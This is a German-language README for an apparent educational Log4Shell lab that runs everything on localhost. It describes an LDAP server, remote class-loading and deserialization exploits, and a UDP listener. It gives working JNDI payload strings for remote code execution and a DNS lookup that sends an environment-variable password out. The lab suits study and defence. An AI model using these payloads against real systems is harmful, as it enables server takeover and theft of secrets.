# Übersicht

Die Komponenten sind:

- log4shell: Loggt eine Logzeile mit log4j.
- ldap: Ein simpler LDAP-Server.
- remote: Der Exploit, der für remote Classloading verwendet wird.
- serialization: Der Exploit, der ein serialisiertes Objekt für den Exploit erstellt.
  - Um dies Auszunutzen muss z.B: `commons-collections:commons-collections:3.1` im Classpath sein.
- serve_exploit.sh: Kompiliert das remote-Projekt und startet einen Server, der das Classfile ausliefert.
- listen_to_udp.sh: Öffnet ein UDP-Port und gibt eine Antwort.

In `build.gradle` von `log4shell` wird `Dcom.sun.jndi.ldap.object.trustURLCodebase=true` gesetzt, damit
der Remote-Classloading Teil funktioniert. Es ist natürlich interessant die Beispiele einfach mal ohne diesen
Parameter durchzuspielen.

#  Vorbereitung

- `gradle ldap:run`, um den LDAP-Server zu starten.
- `./serve_exploit.sh`, um den Exploit zu kompilieren und den Server zu starten, der den Code ausliefert.
- `./listen_to_udp.py`, um Daten auf UDP Port 1053 anzunehmen.

# Testen des Exploits

Rufe

```
gradle log4shell:run --args="<logstring>" 
```

mit den folgenden Werten für `logstring` auf:

- `\${jndi:ldap://127.0.0.1:1389/dc=javaNamingReference}` für den Remote Code Exploit.
- `\${jndi:ldap://127.0.0.1:1389/dc=javaSerializedData}` für den Exploit, der Klassen im Classpath verwendet.
- `\${jndi:dns://127.0.0.1:1053/\${env:MY_PASSWORD}}` um Daten via DNS zu übertragen. Dabei sollte `MY_PASSWORD` vorher
  entsprechend gesetzt werden.
